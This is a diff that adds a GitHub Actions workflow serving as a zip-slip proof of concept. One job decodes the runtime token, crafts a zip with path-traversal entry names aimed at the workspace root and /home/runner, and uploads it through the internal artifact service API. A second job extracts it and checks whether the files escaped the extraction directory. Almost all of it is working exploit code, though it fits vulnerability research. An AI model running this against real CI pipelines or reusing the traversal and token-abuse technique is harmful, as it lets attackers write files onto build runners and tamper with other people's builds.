@@ -1,0 +1,95 @@
+name: artifact-zipslip
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+env:
+  ART_NAME: zipslip-probe
+jobs:
+  untrusted:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft zip and upload through the runtime artifact service
+        env:
+          RUNTIME_TOKEN: ${{ github.token }}
+        run: |
+          python3 - <<'PY'
+          import base64, json, os, zipfile, hashlib, urllib.request
+
+          rt = os.environ.get('ACTIONS_RUNTIME_TOKEN')
+          results = os.environ.get('ACTIONS_RESULTS_URL')
+          assert rt and results, "missing ACTIONS_RUNTIME_TOKEN / ACTIONS_RESULTS_URL"
+          payload = rt.split('.')[1]
+          payload += '=' * (-len(payload) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          scp = claims.get('scp', '')
+          run_id = job_id = None
+          for part in scp.split(' '):
+              bits = part.split(':')
+              if bits and bits[0] == 'Actions.Results':
+                  run_id, job_id = bits[1], bits[2]
+          assert run_id and job_id, f"no Actions.Results scope in {scp!r}"
+          print("runBackendId", run_id, "jobBackendId", job_id)
+
+          zip_path = "artifact.zip"
+          with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
+              z.writestr("../PWNED-OUTSIDE.txt", "ZIPSLIP: wrote outside the extraction directory\n")
+              z.writestr("../../../../home/runner/PWNED-HOME.txt", "ZIPSLIP: wrote into runner home\n")
+              z.writestr("benign.txt", "benign artifact content\n")
+          data = open(zip_path, "rb").read()
+          print("zip bytes", len(data), "sha256", hashlib.sha256(data).hexdigest())
+
+          base = results.rstrip('/')
+          svc = base + "/twirp/github.actions.results.api.v1.ArtifactService/"
+
+          def post(method, obj):
+              req = urllib.request.Request(svc + method, data=json.dumps(obj).encode(),
+                                           headers={"Content-Type": "application/json",
+                                                    "Authorization": "Bearer " + rt})
+              with urllib.request.urlopen(req, timeout=60) as r:
+                  return json.loads(r.read().decode())
+
+          created = post("CreateArtifact", {
+              "workflowRunBackendId": run_id,
+              "workflowJobRunBackendId": job_id,
+              "name": os.environ["ART_NAME"],
+              "mimeType": "application/zip",
+              "version": 7,
+          })
+          print("create:", json.dumps(created)[:300])
+          assert created.get("ok") is not False and created.get("signedUploadUrl"), "create failed"
+          url = created["signedUploadUrl"]
+          put = urllib.request.Request(url, data=data, method="PUT",
+                                       headers={"x-ms-blob-type": "BlockBlob",
+                                                "Content-Type": "application/zip"})
+          with urllib.request.urlopen(put, timeout=120) as r:
+              print("blob PUT", r.status)
+          fin = post("FinalizeArtifact", {
+              "workflowRunBackendId": run_id,
+              "workflowJobRunBackendId": job_id,
+              "name": os.environ["ART_NAME"],
+              "size": str(len(data)),
+              "hash": "sha256:" + hashlib.sha256(data).hexdigest(),
+          })
+          print("finalize:", json.dumps(fin)[:300])
+          PY
+
+  victim:
+    needs: untrusted
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: extract the artifact the untrusted job supplied
+        uses: actions/download-artifact@v4
+        with:
+          name: zipslip-probe
+          path: downloads
+      - name: did the extraction escape its directory
+        run: |
+          set +e
+          echo "--- workspace root ---"; ls -la "$GITHUB_WORKSPACE" | head -20
+          echo "--- outside probe (workspace root) ---"
+          cat "$GITHUB_WORKSPACE/PWNED-OUTSIDE.txt" 2>&1 || echo "PWNED-OUTSIDE: absent"
+          echo "--- outside probe (runner home) ---"
+          cat /home/runner/PWNED-HOME.txt 2>&1 || echo "PWNED-HOME: absent"
+          echo "--- extraction dir ---"; ls -la downloads 2>&1 | head
